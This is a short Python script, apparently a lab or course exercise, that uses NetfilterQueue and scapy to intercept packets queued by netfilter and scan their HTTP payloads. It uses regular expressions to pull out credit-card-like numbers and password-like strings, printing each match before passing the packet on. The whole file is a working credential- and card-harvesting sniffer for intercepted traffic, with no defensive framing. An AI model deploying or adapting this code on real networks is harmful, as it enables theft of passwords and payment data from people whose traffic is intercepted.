from netfilterqueue import NetfilterQueue
from scapy.all import *
import socket
import re


def print_and_accept(pkt):
    ip = IP(pkt.get_payload())
    if ip.haslayer(Raw):
        http = ip[Raw].load.decode()

        cc_re = re.compile(r'\b\d{4}\.\d{4}\.\d{4}\.\d{4}\b')
        pwd_re = re.compile(r'(?=.*\d)(?=.*[A-Z])(?=.*[:;<=>?@]).+')

        cc_match = cc_re.search(http)
        pwd_match = pwd_re.search(http)

        if cc_match:
            print("Matched CC: {}".format(cc_match.group()))

        elif pwd_match:
            print("Matched password: {}".format(pwd_match.group()))

        else:
            print("Nothing interesting in this packet")

    pkt.accept()


try:
    with NetfilterQueue() as nfqueue:
        nfqueue.bind(1, print_and_accept)
        s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
        nfqueue.run_socket(s)
except KeyboardInterrupt:
    print('Interrupted')
except Exception as e:
    print('Error: {}'.format(e))
finally:
    nfqueue.unbind()
